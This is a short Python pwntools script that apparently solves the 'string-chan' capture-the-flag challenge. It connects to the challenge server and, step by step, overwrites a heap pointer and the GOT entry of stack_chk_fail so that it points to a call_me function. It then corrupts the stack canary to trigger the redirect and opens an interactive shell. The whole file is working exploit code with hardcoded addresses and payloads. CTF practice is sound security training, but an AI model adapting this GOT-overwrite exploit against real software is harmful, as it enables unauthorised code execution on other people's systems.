from pwn import *

io = remote('string-chan-ced72ca3d58da37f.chall.ctf.blackpinker.com', 443, ssl=True)
#io = process('./chall')

# If we write a lot of bytes then the program will put it in a heap location
# Meaning that our stack location is now a pointer to the heap address
io.recvuntil(b'choice: ')
io.sendline(b'3')
io.recvuntil(b'str: ')
io.sendline(b'i'*32)

# Overwrite this heap address to a got of stack_chk_fail
io.recvuntil(b'choice: ')
io.sendline(b'1')
io.recvuntil(b'c_str: ')
io.sendline(b'i'*32 + p64(0x404058))

# Overwrite the got of stack_chk_fail to call_me
call_me = 0x4016de
io.recvuntil(b'choice: ')
io.sendline(b'3')
io.recvuntil(b'str: ')
io.sendline(p64(call_me))

# Poke the canary to trigger stack_chk_fail
io.recvuntil(b'choice: ')
io.sendline(b'1')
io.recvuntil(b'c_str: ')
io.sendline(b'\0'*72 + b'abcd')

# Get shell
io.recvuntil(b'choice: ')
io.sendline(b'5')
io.interactive()